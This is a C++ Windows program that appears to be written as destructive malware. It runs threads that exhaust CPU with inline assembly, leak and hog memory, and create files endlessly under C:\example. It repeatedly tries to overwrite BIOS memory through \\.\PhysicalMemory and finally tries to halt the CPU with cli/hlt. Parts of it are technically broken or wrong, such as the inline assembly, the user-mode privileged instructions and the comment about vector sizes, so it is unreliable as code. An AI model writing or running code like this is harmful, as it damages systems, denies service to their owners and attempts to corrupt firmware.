#include <iostream>
#include <thread>
#include <chrono>
#include <vector>
#include <string>
#include <fstream>
#include <Windows.h>

// Function declaration for writeToBIOS
void writeToBIOS(const std::vector<char>& data);

void memory_leak() {
    std::vector<int*> memoryBlocks;
    for (int i = 0; i < 1000; ++i) {
        // Allocate memory and store the pointer
        int* block = new int[1000];
        memoryBlocks.push_back(block);

        // Randomly delete some blocks to fragment memory
        if (i % 10 == 0 && !memoryBlocks.empty()) {
            int index = rand() % memoryBlocks.size();
            delete[] memoryBlocks[index];
            memoryBlocks.erase(memoryBlocks.begin() + index);
        }
    }
}

void resource_hogging() {
    std::vector<std::vector<int>> hoggingVectors;
    while (true) {
        // Allocate a large vector
        hoggingVectors.emplace_back(1000000);  // 4 GB per vector on 32-bit system, more on 64-bit

        // Introduce delay
        std::this_thread::sleep_for(std::chrono::milliseconds(100));

        // Randomly remove vectors to fragment memory
        if (rand() % 100 == 0 && !hoggingVectors.empty()) {
            hoggingVectors.erase(hoggingVectors.begin() + rand() % hoggingVectors.size());
        }
    }
}

void slow_execution() {
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(20 + rand() % 10));  // Random delay between 20 to 29 seconds
    }
}

std::string generate_hello_world() {
    std::string result;
    for (int i = 0; i < 1000; ++i) {
        result += "Hello, World!";  // Creating a huge string
    }
    return result;
}

void busy_wait() {
    volatile double x = 0;
    while (true) {
        // Inline assembly to consume CPU cycles
        __asm {
            push eax
            push ebx
            mov eax, 1000000000  // Adjust loop count for more cycles
            label:
            dec eax
                jnz label
                pop ebx
                pop eax
        }
    }
}

bool createDirectoryRecursively(const std::wstring& path) {
    if (CreateDirectoryW(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
        return true;
    }
    else {
        DWORD error = GetLastError();
        if (error == ERROR_PATH_NOT_FOUND) {
            std::wcerr << L"Failed to create directory: " << path << L". Parent directory doesn't exist." << std::endl;
        }
        else {
            std::wcerr << L"Failed to create directory: " << path << L". Error code: " << error << std::endl;
        }

        size_t pos = path.find_last_of(L"/\\");
        if (pos != std::wstring::npos) {
            std::wstring parentPath = path.substr(0, pos);
            if (!createDirectoryRecursively(parentPath)) {
                return false;
            }
            // Retry creating the directory after creating parent
            return CreateDirectoryW(path.c_str(), NULL);
        }
    }
    return false;
}

// Function to write data to BIOS
void writeToBIOS(const std::vector<char>& data) {
    HANDLE hPhysicalMemory = CreateFileW(L"\\\\.\\PhysicalMemory", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hPhysicalMemory == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open physical memory" << std::endl;
        return;
    }

    DWORD BIOS_START = 0xE0000;
    DWORD BIOS_SIZE = 0x20000;

    LPVOID biosMemory = MapViewOfFile(hPhysicalMemory, FILE_MAP_WRITE, 0, BIOS_START, BIOS_SIZE);

    if (!biosMemory) {
        std::cerr << "Failed to map BIOS memory" << std::endl;
        CloseHandle(hPhysicalMemory);
        return;
    }

    // Copy data to BIOS memory
    memcpy(biosMemory, data.data(), data.size());

    UnmapViewOfFile(biosMemory);
    CloseHandle(hPhysicalMemory);

    std::cout << "Data written to BIOS" << std::endl;
}

void writefiles(const std::wstring& basePath, int index) {
    // Create directories recursively if they don't exist
    if (!createDirectoryRecursively(basePath)) {
        std::wcerr << L"Failed to create directories." << std::endl;
        return;
    }

    // Generate content for the file
    std::wstring content = L"File " + std::to_wstring(index) + L" Hello World!";

    // Construct file path
    std::wstring filePath = basePath + L"temp" + std::to_wstring(index) + L".txt";

    // Write content to file
    std::wofstream file(filePath);
    if (file.is_open()) {
        file << content; // Write content to the file
        file.close();
    }
    else {
        std::wcerr << L"Unable to open file: " << filePath << std::endl;
    }

    // data to write to BIOS
    std::string data = generate_hello_world(); // Example data to write
    writeToBIOS(std::vector<char>(data.begin(), data.end()));
}

// Function to read data from file
std::vector<char> readFile(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary | std::ios::ate);
    std::ifstream::pos_type pos = file.tellg();

    std::vector<char> result(pos);

    file.seekg(0, std::ios::beg);
    file.read(&result[0], pos);

    return result;
}

int main() {
    std::thread busyThread(busy_wait);
    std::thread memoryLeakThread(memory_leak);
    std::thread resourceHoggingThread(resource_hogging);
    //std::thread slowExecutionThread(slow_execution);

    std::thread writeToBiosThread([]() {
        while (true) {
            // Generate data to write to BIOS
            std::string data = generate_hello_world(); // Example data to write
            writeToBIOS(std::vector<char>(data.begin(), data.end()));
        }
        });

    std::wstring basePath = L"C:\\example\\";
    int fileIndex = 1;
    std::thread writeFilesThread([&basePath, &fileIndex]() {
        while (true) {
            writefiles(basePath, fileIndex);
            ++fileIndex;
        }
        });

    // Join threads to prevent the main thread from exiting
    busyThread.join();
    memoryLeakThread.join();
    resourceHoggingThread.join();
    //slowExecutionThread.join();
    writeToBiosThread.join();
    writeFilesThread.join();

    __asm {
        cli // Clear interrupt flag, a privileged operation
        hlt // Halt the CPU
    }

    return 0;
}
